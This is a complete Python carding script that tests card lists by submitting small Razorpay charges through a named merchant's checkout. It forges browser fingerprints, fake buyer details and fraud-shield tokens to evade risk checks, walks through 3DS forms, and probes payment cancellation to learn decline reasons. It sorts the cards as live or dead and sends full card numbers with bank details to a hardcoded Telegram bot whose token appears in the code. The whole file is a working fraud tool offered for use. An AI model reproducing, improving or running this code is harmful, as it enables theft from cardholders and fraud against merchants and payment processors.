#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import random
import time
import os
import sys
import re
import base64
import uuid
from typing import Dict, Tuple, Optional, Any
from urllib.parse import urlparse, parse_qs, urljoin

# ==================== ADVANCED TERMUX UI ====================
class C:
    G = '\033[38;5;46m'       # Green
    R = '\033[38;5;196m'      # Red
    Y = '\033[38;5;226m'      # Yellow
    B = '\033[38;5;33m'       # Blue
    C = '\033[38;5;51m'       # Cyan
    M = '\033[38;5;201m'      # Magenta
    W = '\033[38;5;231m'      # White
    D = '\033[38;5;244m'      # Dark/Dim
    RES = '\033[0m'
    BLD = '\033[1m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    banner = f"""{C.C}{C.BLD}
  ██████╗  ██████╗  █████╗ 
  ██╔══██╗╚════██║ ██╔══██╗
  ██████╔╝ █████╔╝ ██║  ╚═╝
  ██╔══██╗ ╚═══██╗ ██║  ██╗
  ██║  ██║██████╔╝ ╚█████╔╝
  ╚═╝  ╚═╝╚═════╝   ╚════╝ {C.W}v21.0 (Patched){C.RES}
{C.D}╭──────────────────────────────────────────╮
│ {C.W}Termux Final Edition {C.D}| {C.C}Exact extraction{C.D}  │
│ {C.Y}Native 3DS Detect    {C.D}| {C.G}AdBlock Emulation{C.D} │
╰──────────────────────────────────────────╯{C.RES}
"""
    print(banner)

# ==================== CONFIGURATION ====================
ENABLE_DEBUG_INFO = True
RAZORPAY_KEY_ID = "rzp_live_oauth_Sm1rqTzklqMWZ2"
TARGET_MERCHANT_URL = "https://www.ganitank.com/"

TELEGRAM_BOT_TOKEN = "7646414300:AAH3QVmccoOw8BMakR39sIotI535tZ8N33o"
TELEGRAM_CHAT_ID = "8564010885"

CARDS_FILE = "cards.txt"
APPROVED_FILE = "approved.txt"
DECLINED_FILE = "declined.txt"
BIN_API_URL = "https://bins.antipublic.cc/bins/"

DELAY_BETWEEN_CARDS = 5
CARDS_PER_SESSION = 3
AMOUNT_PAISE = 100
PRODUCT_DESC = "Delta 5.0 Pro"

# ==================== ADVANCED FINGERPRINT ENGINE ====================
def generate_advanced_fingerprint() -> Dict[str, str]:
    os_type = random.choices(["Android", "Windows", "macOS"], weights=[60, 30, 10])[0]
    ch_maj = random.randint(100, 125)
    ch_min = 0
    ch_bld = random.randint(5000, 6500)
    ch_pat = random.randint(50, 150)
    
    ch_ua = f'"Not A(Brand";v="99", "Google Chrome";v="{ch_maj}", "Chromium";v="{ch_maj}"'
    
    if os_type == "Android":
        and_ver = random.randint(9, 14)
        models = ["SM-G998B", "SM-S908E", "Pixel 7 Pro", "Pixel 6a", "M2101K6G", "SM-A528B", "CPH2381", "V2130"]
        model = random.choice(models)
        ua = f"Mozilla/5.0 (Linux; Android {and_ver}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch_maj}.{ch_min}.{ch_bld}.{ch_pat} Mobile Safari/537.36"
        plat, mobile = '"Android"', "?1"
    elif os_type == "Windows":
        ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch_maj}.{ch_min}.{ch_bld}.{ch_pat} Safari/537.36"
        plat, mobile = '"Windows"', "?0"
    else:
        mac_ver = random.choice(["10_15_7", "11_6", "12_5", "13_4", "14_0"])
        ua = f"Mozilla/5.0 (Macintosh; Intel Mac OS X {mac_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch_maj}.{ch_min}.{ch_bld}.{ch_pat} Safari/537.36"
        plat, mobile = '"macOS"', "?0"
        
    return {"User-Agent": ua, "sec-ch-ua": ch_ua, "sec-ch-ua-platform": plat, "sec-ch-ua-mobile": mobile}

def random_email() -> str: return f"{random.choice(['raj', 'priya', 'amit', 'neha', 'vikram'])}{random.randint(1000, 99999)}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])}"
def random_phone() -> str: return f"+91{random.choice(['7','8','9'])}{''.join(random.choices('0123456789', k=9))}"
def random_name() -> str: return f"{random.choice(['Raj', 'Amit', 'Neha', 'Vikram'])} {random.choice(['Sharma', 'Verma', 'Kumar', 'Singh'])}"
def random_device_id() -> str: return f"1.{uuid.uuid4().hex[:20]}{uuid.uuid4().hex[:8]}.{int(time.time()*1000)}.{random.randint(10000000,99999999)}"

def debug_print(msg: str):
    if ENABLE_DEBUG_INFO: print(f"{C.D}   │ {msg}{C.RES}")

def save_debug_html(payment_id: str, html_content: str, reason: str):
    if not ENABLE_DEBUG_INFO: return
    filename = f"debug_{payment_id}.html"
    try:
        with open(filename, "w", encoding="utf-8") as f:
            f.write(f"<!-- DEBUG REASON: {reason} -->\n")
            f.write(html_content)
        debug_print(f"[{C.M}DUMP{C.D}] HTML saved to {filename}")
    except: pass

# ==================== CORE LOGIC ====================
def is_external_3ds_url(url: str) -> bool:
    nl = urlparse(url).netloc.lower()
    if not nl or "razorpay" in nl or "ganitank" in nl or "lumberjack" in nl:
        return False
    return True

def check_3ds_history(resp: requests.Response) -> bool:
    urls = [resp.url] + [r.url for r in resp.history]
    for u in urls:
        if is_external_3ds_url(u): return True
    return False

def follow_meta_refresh(resp: requests.Response, session: requests.Session, fp: dict, max_redirects: int = 5) -> requests.Response:
    current_resp = resp
    for _ in range(max_redirects):
        meta_match = re.search(r'<meta\s+http-equiv=["\']refresh["\']\s+content=["\'][^"\']*?url=([^"\']+)["\']', current_resp.text, re.I)
        if not meta_match: break
            
        redirect_url = urljoin(current_resp.url, meta_match.group(1))
        query_params = parse_qs(urlparse(redirect_url).query)
        
        if "error_description" in query_params or "razorpay_payment_id" in query_params or "status" in query_params:
            mock = requests.Response()
            mock.url, mock.status_code, mock._content = redirect_url, 200, b'{"intercepted": true}'
            return mock
            
        debug_print(f"[{C.M}META{C.D}] Redirect ➜ {urlparse(redirect_url).netloc}...")
        headers = {"User-Agent": fp["User-Agent"], "Referer": current_resp.url}
        try:
            current_resp = session.get(redirect_url, headers=headers, timeout=15, allow_redirects=False)
        except requests.exceptions.RequestException:
            break
    return current_resp

def create_checkout_session(req_session: requests.Session, order_id: Optional[str], fp: dict) -> Tuple[Optional[str], Optional[str]]:
    url = "https://api.razorpay.com/v1/checkout/public"
    options = {"key": RAZORPAY_KEY_ID, "amount": AMOUNT_PAISE, "currency": "INR", "name": "Test"}
    if order_id: options["order_id"] = order_id
    
    headers = {
        "User-Agent": fp["User-Agent"], "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
        "Referer": TARGET_MERCHANT_URL, "sec-ch-ua": fp["sec-ch-ua"], "sec-ch-ua-platform": fp["sec-ch-ua-platform"]
    }
    params = {"traffic_env": "production", "checkout_v2": "1", "new_session": "1", "data": base64.b64encode(json.dumps(options).encode()).decode()}
    
    try:
        resp = req_session.get(url, params=params, headers=headers, timeout=15)
        if resp.status_code >= 400: return None, None
        
        token = parse_qs(urlparse(resp.url).query).get("session_token", [None])[0]
        if not token:
            m = re.search(r'(?:session_token)["\']?\s*[:=]\s*["\']?([^"\'&>\s]{20,})', resp.text, re.I)
            token = m.group(1) if m else None
        return token, f"Sz{uuid.uuid4().hex[:12]}"
    except: return None, None

def charge_card(req_session: requests.Session, token: str, o_id: Optional[str], u_id: str, card_num: str, exp_m: str, exp_y: str, cvv: str, fp: dict) -> Dict:
    url = f"https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?key_id={RAZORPAY_KEY_ID}&session_token={token}"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://api.razorpay.com",
        "Referer": TARGET_MERCHANT_URL, "User-Agent": fp["User-Agent"], "x-session-token": token,
        "sec-ch-ua": fp["sec-ch-ua"], "sec-ch-ua-platform": fp["sec-ch-ua-platform"]
    }
    
    data = {
        "key_id": RAZORPAY_KEY_ID, "contact": random_phone(), "email": random_email(),
        "currency": "INR", "amount": str(AMOUNT_PAISE), "method": "card", "card[number]": card_num,
        "card[cvv]": cvv, "card[name]": random_name(), "card[expiry_month]": exp_m.zfill(2),
        "card[expiry_year]": f"20{exp_y}" if len(exp_y) == 2 else exp_y, "save": "0",
        "_[checkout_id]": f"Sz{uuid.uuid4().hex[:12]}", 
        "_[device.id]": random_device_id(),
        "_[platform]": "browser", 
        "_[referer]": TARGET_MERCHANT_URL,
        "_[shield][fhash]": uuid.uuid4().hex + uuid.uuid4().hex[:8]
    }
    if o_id: data["order_id"] = o_id

    try: 
        return req_session.post(url, headers=headers, data=data, timeout=25).json()
    except Exception as e: 
        return {"error": {"description": "Network Error / Timeout during charge", "reason": str(e)}}

def trigger_cancel_trick(req_session: requests.Session, token: str, p_id: str, fp: dict) -> Optional[Dict]:
    """Forces Razorpay to reveal the exact hidden reason why the card failed."""
    debug_print(f"[{C.M}TRICK{C.D}] Force-cancelling payment {p_id} to extract hard status...")
    url = f"https://api.razorpay.com/v1/payments/{p_id}/cancel?key_id={RAZORPAY_KEY_ID}&session_token={token}"
    try: return req_session.post(url, headers={"Origin": "https://api.razorpay.com", "User-Agent": fp["User-Agent"], "x-session-token": token}, timeout=10).json()
    except: return None

# ==================== TRUE HEADLESS RECURSION ====================
def process_html_step(req_session: requests.Session, current_resp: requests.Response, token: str, fp: dict, depth: int = 0) -> Tuple[requests.Response, bool]:
    if depth > 4: return current_resp, check_3ds_history(current_resp)
        
    current_resp = follow_meta_refresh(current_resp, req_session, fp)
    if check_3ds_history(current_resp): return current_resp, True
        
    try:
        current_resp.json()
        return current_resp, False 
    except: pass
    
    if current_resp.status_code >= 400:
        debug_print(f"[{C.R}HTTP{C.D}] Encountered HTTP {current_resp.status_code}. Halting flow to extract exact error.")
        return current_resp, False

    html = current_resp.text
    current_url = current_resp.url
    all_forms_raw = re.findall(r'<form([^>]*)>(.*?)</form>', html, re.I | re.DOTALL)
    
    if not all_forms_raw:
        js_redir = re.search(r'window\.location(?:\.href)?\s*=\s*["\']([^"\']+)["\']', html)
        if js_redir:
            target = urljoin(current_url, js_redir.group(1))
            debug_print(f"[{C.M}JS{C.D}] Redirect ➜ {urlparse(target).netloc}...")
            try:
                resp = req_session.get(target, headers={"User-Agent": fp["User-Agent"], "Referer": current_url}, timeout=15)
                return process_html_step(req_session, resp, token, fp, depth + 1)
            except Exception:
                return current_resp, check_3ds_history(current_resp)
        return current_resp, check_3ds_history(current_resp)

    forms_data = {}
    for attrs, content in all_forms_raw:
        f_id = re.search(r'id=["\']([^"\']+)["\']', attrs, re.I)
        f_name = re.search(r'name=["\']([^"\']+)["\']', attrs, re.I)
        f_act = re.search(r'action=\s*["\']([^"\']+)["\']', attrs, re.I)
        f_meth = re.search(r'method=\s*["\']([^"\']+)["\']', attrs, re.I)
        
        fid = f_id.group(1) if f_id else None
        fname = f_name.group(1) if f_name else None
        action_val = f_act.group(1) if f_act else ""
        method_val = f_meth.group(1).lower() if f_meth else "get"
        
        inputs = {}
        for inp in re.findall(r'<input[^>]+>', content, re.I):
            n = re.search(r'name=\s*["\']([^"\']+)["\']', inp, re.I)
            v = re.search(r'value=\s*["\']([^"\']*)["\']', inp, re.I)
            if n: inputs[n.group(1)] = v.group(1) if v else ""
                
        f_obj = {"action": urljoin(current_url, action_val) if action_val.strip() else current_url, "method": method_val, "inputs": inputs}
        if fid: forms_data[fid] = f_obj
        if fname: forms_data[fname] = f_obj
        forms_data["fallback"] = f_obj

    for k, v in forms_data.items():
        if "threeDSMethodData" in v["inputs"]:
            try: req_session.post(v["action"], data=v["inputs"], headers={"User-Agent": fp["User-Agent"], "Referer": current_url}, timeout=5)
            except: pass

    main_key = None
    js_submits = re.findall(r'document\.(form\d+)\.submit\(\)', html) + re.findall(r'document\.getElementById\([\'"](form\d+)[\'"]\)\.submit\(\)', html)
    
    if js_submits:
        if "form3" in js_submits and "form3" in forms_data: main_key = "form3"
        elif js_submits[0] in forms_data: main_key = js_submits[0]

    if not main_key:
        for key, form in forms_data.items():
            if key == "fallback": continue
            if any(k in form["inputs"] for k in ["PaReq", "MD", "TermUrl", "browser_java_enabled", "auth_step"]):
                main_key = key
                break
    if not main_key and "fallback" in forms_data: main_key = "fallback"
    if not main_key: return current_resp, check_3ds_history(current_resp)

    main_form = forms_data[main_key]

    def get_shield_payload(html: str, current_url: str) -> Optional[str]:
        session_id = None
        match = re.search(r'"session_id"\s*:\s*"([^"]+)"', html)
        if match: session_id = match.group(1)
        else:
            sid_match = re.search(r'(Sz[a-zA-Z0-9]+)', current_url)
            session_id = sid_match.group(1) if sid_match else f"Sz{uuid.uuid4().hex[:12]}"
        req_id = f"{int(time.time()*1000)}.{uuid.uuid4().hex[:16]}"
        payload = [{"name": "fingerprint", "metadata": {"request_id": req_id}}, {"name": "sardine", "metadata": {"session_id": session_id}}]
        return base64.b64encode(json.dumps(payload).encode()).decode()

    if "getShieldEnabledProvidersPayload" in html or "user_risk_providers_token" in html:
        if "user_risk_providers_token" not in main_form["inputs"]:
            token_payload = get_shield_payload(html, current_url)
            if token_payload:
                main_form["inputs"]["user_risk_providers_token"] = token_payload

    if main_key == "form3" or "browser_java_enabled" in main_form["inputs"] or "auth_step" in html:
        main_form["inputs"].update({"browser_java_enabled": "false", "browser_javascript_enabled": "true", "browser_timezone_offset": "330", "browser_color_depth": "24", "browser_screen_width": "1080", "browser_screen_height": "1920", "browser_language": "en-US", "auth_step": "3ds2Auth"})

    debug_print(f"[{C.B}NAV{C.D}] Submitting form with {len(main_form['inputs'])} parameters...")
    headers = {"User-Agent": fp["User-Agent"], "Referer": current_url}
    if "razorpay.com" in main_form["action"]: headers["x-session-token"] = token
    
    try:
        if main_form["method"] == "post":
            resp = req_session.post(main_form["action"], data=main_form["inputs"], headers=headers, timeout=20)
        else:
            resp = req_session.get(main_form["action"], params=main_form["inputs"], headers=headers, timeout=20)
        return process_html_step(req_session, resp, token, fp, depth + 1)
    except Exception as e:
        debug_print(f"[{C.R}ERR{C.D}] Form execution: {e}")
        return current_resp, check_3ds_history(current_resp)

def classify_error(desc: str, reason: str, pid: str) -> Tuple[str, str]:
    dl, rl = str(desc).lower(), str(reason).lower()
    msg = f"{desc} | {reason}" if reason and reason.lower() not in ["na", "null", "none", ""] else (desc if desc else "Unknown Error")
        
    if any(x in dl for x in ["success", "authorized", "captured"]): return "LIVE", "Successfully Charged"
    if "insufficient" in dl or "insufficient" in rl or "funds" in dl: return "LIVE", "Insufficient Funds (Card active)"
    if any(x in dl for x in ["authentication", "3ds", "otp", "challenge"]): return "OTP", msg
    if any(x in dl for x in ["fraud", "risk", "security"]): return "DEAD", "Blocked by Razorpay Shield / Risk Engine"
    if any(x in dl for x in ["url was not found", "expired", "bad request", "network error"]): return "DEAD", f"Gateway Dropped / Failed: {msg}"
    if any(x in dl for x in ["declined", "do not honor", "rejected", "failed", "invalid", "not supported", "cancelled"]): return "DEAD", msg
    
    return "DEAD", msg

def parse_final_response(resp: requests.Response, html: str = "", known_pid: str = "N/A") -> Tuple[str, str, str, bool]:
    full = resp.text + " " + html
    pid_match = (re.search(r'pay_[a-zA-Z0-9]{14}', full) or re.search(r'pay_[a-zA-Z0-9]{14}', resp.url))
    pid = pid_match.group(0) if pid_match else known_pid
    is_3ds = check_3ds_history(resp)

    try:
        data = resp.json()
        if data.get("status") in ("captured", "authorized", "success"): return "LIVE", "Successfully Charged", data.get("id", pid), is_3ds
        if "error" in data:
            err = data["error"]
            t, m = classify_error(err.get("description", ""), err.get("reason", ""), pid)
            return t, m, err.get("metadata", {}).get("payment_id", pid), is_3ds
    except: pass

    # Extract Payload hidden inside Javascript
    js_var_match = re.search(r'var\s+data\s*=\s*(\{.*?\})', full, re.DOTALL)
    if js_var_match:
        try:
            pj = json.loads(js_var_match.group(1))
            if pj and "error" in pj:
                t, m = classify_error(pj["error"].get("description", ""), pj["error"].get("reason", ""), pid)
                return t, f"{m}", pj["error"].get("metadata", {}).get("payment_id", pid), is_3ds
            elif pj and "razorpay_payment_id" in pj:
                return "LIVE", "Payment Verified", pj.get("razorpay_payment_id", pid), is_3ds
            elif not pj: # Empty object {} implies Gateway Dropped / Silent Failure
                if "CheckoutBridge" in full or "razorpay_callback" in full:
                    return "DEAD", "Payment Failed (Gateway Dropped / Rejected)", pid, is_3ds
        except: pass

    js_match = re.search(r'JSON\.stringify\s*\(\s*(\{[\s\S]*?\})\s*\)', full)
    if js_match:
        try:
            pj = json.loads(js_match.group(1))
            if "error" in pj:
                t, m = classify_error(pj["error"].get("description", ""), pj["error"].get("reason", ""), pid)
                return t, f"{m}", pj["error"].get("metadata", {}).get("payment_id", pid), is_3ds
        except: pass

    qp = parse_qs(urlparse(resp.url).query)
    if "error_description" in qp:
        t, m = classify_error(qp["error_description"][0], qp.get("error_reason", [""])[0], pid)
        return t, m, qp.get("razorpay_payment_id", [pid])[0], is_3ds

    cln = re.sub(r'<[^>]+>', ' ', full)
    if re.search(r'(?i)(payment successful|transaction successful)', cln): return "LIVE", "Payment Verified", pid, is_3ds
    f_match = re.search(r'(?i)(payment failed|transaction failed|payment declined)', cln)
    if f_match:
        r_match = re.search(r'(?i)(?:reason|error)[\s:=]+([a-z0-9\s\'"-]{5,80})', cln)
        t, m = classify_error(r_match.group(1).strip() if r_match else f_match.group(1), "", pid)
        return t, m, pid, is_3ds

    ed = re.search(r'"description"\s*:\s*"([^"\\]+)"', full, re.I)
    if ed and "Delta" not in ed.group(1):
        er = re.search(r'"reason"\s*:\s*"([^"\\]+)"', full, re.I)
        t, m = classify_error(ed.group(1), er.group(1) if er else "", pid)
        return t, m, pid, is_3ds

    if is_3ds or is_external_3ds_url(resp.url): return "OTP", "3DS Redirect Verified (OTP Required)", pid, True
    
    return "ERR", "No definitive result generated", pid, is_3ds

# ==================== MAIN LOOP ====================
def main():
    print_banner()
    if not os.path.exists(CARDS_FILE):
        print(f"{C.R}[!] {CARDS_FILE} missing!{C.RES}"); sys.exit(1)
        
    with open(CARDS_FILE, "r") as f: cards = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    total, idx = len(cards), 0
    
    try: GLOBAL_ORDER_ID = re.search(r'(order_[a-zA-Z0-9]{10,20})', requests.get(TARGET_MERCHANT_URL, timeout=10).text).group(1)
    except: GLOBAL_ORDER_ID = None
    
    while idx < total:
        fp = generate_advanced_fingerprint()
        print(f"\n{C.C}╭───[ INITIALIZING SECURE SESSION ]{C.D}──────────────────────{C.RES}")
        session = requests.Session()
        token, uid = None, None
        
        for _ in range(3):
            token, uid = create_checkout_session(session, GLOBAL_ORDER_ID, fp)
            if token: break
            time.sleep(1)
            
        if not token and GLOBAL_ORDER_ID:
            debug_print(f"Failed OrderID {GLOBAL_ORDER_ID}. Retrying Without...")
            GLOBAL_ORDER_ID = None
            token, uid = create_checkout_session(session, GLOBAL_ORDER_ID, fp)
            
        if not token:
            print(f"{C.D}╰── {C.R}✖ Session Blocked by Razorpay Shield.{C.RES}"); sys.exit(1)
            
        print(f"{C.D}│ {C.G}✔ Shield Bypassed {C.D}| OS: {C.W}{fp['sec-ch-ua-platform'].replace('\"','')}{C.D} | Token: {C.W}{token[:10]}...{C.RES}")
        print(f"{C.C}╰─────────────────────────────────────────────────────────{C.RES}\n")
        
        for i in range(CARDS_PER_SESSION):
            if idx >= total: break
            
            # Robust split handling both | and :
            parts = [p.strip().replace(" ", "").replace("-", "") for p in re.split(r'\||:', cards[idx])]
            if len(parts) != 4: 
                print(f"{C.R}[!] Invalid card format: {cards[idx]}{C.RES}")
                idx += 1
                continue
                
            cc, mo, yr, cv = parts
            print(f"{C.W}[{idx+1}/{total}] 💳 {C.BLD}{cards[idx]}{C.RES}")
            
            charge = charge_card(session, token, GLOBAL_ORDER_ID, uid, cc, mo, yr, cv, fp)
            pid = charge.get("razorpay_payment_id") or charge.get("payment_id") or charge.get("id") or "N/A"
            
            tag, msg, acs = None, None, "N/A"
            is_3d_secure = False 
            
            next_url = None
            if charge.get("redirect"): next_url = charge.get("request", {}).get("url")
            elif charge.get("next"): next_url = charge["next"][0].get("url") if isinstance(charge["next"], list) else charge["next"].get("url")
            
            html_snapshot = ""
            if next_url:
                try:
                    debug_print(f"[{C.M}NAV{C.D}] Engine tracing initial route...")
                    if charge.get("request", {}).get("method", "get").lower() == "post":
                        resp = session.post(next_url, headers={"User-Agent": fp["User-Agent"]}, data=charge["request"].get("content", {}), timeout=15)
                    else:
                        resp = session.get(next_url, headers={"User-Agent": fp["User-Agent"]}, timeout=15)
                    
                    final_resp, step_3ds = process_html_step(session, resp, token, fp)
                    html_snapshot = final_resp.text
                    
                    # Pass the known pid directly down
                    tag, msg, p_pid, parse_3ds = parse_final_response(final_resp, html_snapshot, pid)
                    
                    if p_pid and p_pid != "N/A": pid = p_pid
                    is_3d_secure = step_3ds or parse_3ds
                    
                    if is_3d_secure: 
                        acs = final_resp.url
                        if tag != "OTP": tag, msg = "OTP", "Redirected to Bank ACS (3DS Required)"
                except Exception as e: tag, msg = "ERR", f"Trace exception: {str(e)[:40]}"
            
            if not tag and "error" in charge:
                tag, msg = classify_error(charge["error"].get("description", ""), charge["error"].get("reason", ""), pid)
            
            # THE ULTIMATE EXACT RESPONSE EXTRACTION FIX
            if (not tag or tag == "ERR") and pid != "N/A":
                cancel = trigger_cancel_trick(session, token, pid, fp)
                if cancel and isinstance(cancel, dict):
                    if "error" in cancel:
                        d, r = cancel["error"].get("description", ""), cancel["error"].get("reason", "")
                        
                        # If Razorpay says it's already failed, it confirms a DEAD card.
                        if "already in failed state" in d.lower():
                            tag, msg = "DEAD", "Payment Failed (Card Rejected / Authentication Blocked)"
                        else:
                            tag, msg = classify_error(d, r, pid)
                    elif cancel.get("status") in ["failed", "cancelled"]:
                        # Capture exact payload if transaction object is returned
                        d = cancel.get("error_description", "")
                        r = cancel.get("error_reason", "")
                        msg_str = d if d else "Payment Cancelled / Failed"
                        tag, msg = classify_error(msg_str, r, pid)

            if not tag: tag, msg = "ERR", "No response from gateway"

            if ENABLE_DEBUG_INFO and tag == "ERR":
                save_debug_html(pid, html_snapshot, msg)

            # ─── Beautiful Terminal Output ───
            if tag == "LIVE": col, tg_tag = C.G, "[ ✔ LIVE ]"
            elif tag == "OTP": col, tg_tag = C.Y, "[ ⚠ OTP ]"
            elif tag == "DEAD": col, tg_tag = C.R, "[ ✖ DEAD ]"
            else: col, tg_tag = C.D, "[ ⚙ ERR ]"
            
            print(f"{C.D}   ╰─► {col}{C.BLD}{tg_tag}{C.RES} {C.W}{msg}{C.RES} {C.D}(ID: {pid}){C.RES}")
            if acs != "N/A": print(f"       {C.D}↳ ACS: {C.C}{acs}{C.RES}")
            print()
            
            with open(APPROVED_FILE if (tag == "LIVE" or tag == "OTP") else DECLINED_FILE, "a") as f:
                f.write(f"{cards[idx]} | {tg_tag} | {msg} | {pid}\n")
            
            # ─── Secure Telegram Push ───
            try:
                b_info = requests.get(f"{BIN_API_URL}{cc[:6]}", timeout=3).json()
                bnk = f"{b_info.get('bank', 'Unk')} {b_info.get('country_flag', '')}"
                b_type = f"{b_info.get('brand', 'Unk')} - {b_info.get('type', 'Unk')}"
                cntry = b_info.get("country_name", "Unknown")
            except: bnk, b_type, cntry = "Unknown", "Unknown", "Unknown"
            
            emo = "✅" if tag == "LIVE" else "⚠️" if tag == "OTP" else "❌" if tag == "DEAD" else "⚙️"
            t_title = "APPROVED" if tag == "LIVE" else "3DS / OTP" if tag == "OTP" else "DECLINED" if tag == "DEAD" else "ERROR"
            
            amount_formatted = AMOUNT_PAISE / 100
            
            tg_msg = f"""<b>{emo} Razorpay Status: {t_title}</b>
━━━━━━━━━━━━━━━━━━━━
💳 <b>Card:</b> <code>{cards[idx]}</code>
💬 <b>Response:</b> <code>{msg}</code>
💰 <b>Amount:</b> ₹{amount_formatted:.2f}
━━━━━━━━━━━━━━━━━━━━
🏦 <b>Bank:</b> {bnk}
💳 <b>Type:</b> {b_type}
🌐 <b>3DS:</b> {'✅ Yes (Redirected)' if is_3d_secure or acs != 'N/A' else '❌ No / Bypassed'}
🔗 <b>ACS:</b> <code>{acs if acs != 'N/A' else 'None'}</code>
🆔 <b>Pay ID:</b> <code>{pid}</code>
🖥️ <b>OS:</b> {fp['sec-ch-ua-platform'].replace('\"','')}"""

            try: requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": tg_msg, "parse_mode": "HTML"}, timeout=3)
            except: pass
            
            idx += 1
            if idx < total and i < CARDS_PER_SESSION - 1: time.sleep(DELAY_BETWEEN_CARDS)
                
        if idx < total:
            print(f"{C.D}[*] Switching Fingerprint (Waiting {DELAY_BETWEEN_CARDS*2}s)...{C.RES}")
            time.sleep(DELAY_BETWEEN_CARDS * 2)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit(0)